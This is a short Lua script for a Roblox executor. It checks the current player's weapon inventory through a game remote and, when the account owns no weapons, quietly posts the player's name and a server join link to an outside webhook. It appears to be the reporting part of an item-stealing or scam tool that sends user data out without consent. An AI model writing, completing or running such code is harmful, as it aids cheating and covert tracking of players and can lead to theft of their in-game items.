local HttpService = game:GetService("HttpService")

local request = syn and syn.request or http_request or request
if not request then error("HTTP not supported") end

local webhook = ""

local p = game.Players.LocalPlayer
local d = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
local inv = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(p.Name)

local c = 0
for id, a in pairs(inv.Weapons.Owned) do
    if id ~= "DefaultGun" and id ~= "DefaultKnife" then
        c = c + a
    end
end

local placeId = game.PlaceId
local jobId = game.JobId
local joinLink = "https://fern.wtf/joiner?placeId=" .. placeId .. "&gameInstanceId=" .. jobId
local timestamp = os.time()

local data = {
    embeds = {{
        description = "New Alt Account Execution\nUser: " .. p.Name,
        color = 0xFF0000,
        timestamp = os.date("!%Y-%m-%dT%H:%M:%S.000Z", timestamp),
        fields = {{
            name = "Join Link",
            value = joinLink,
            inline = false
        }}
    }}
}

if c == 0 then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end
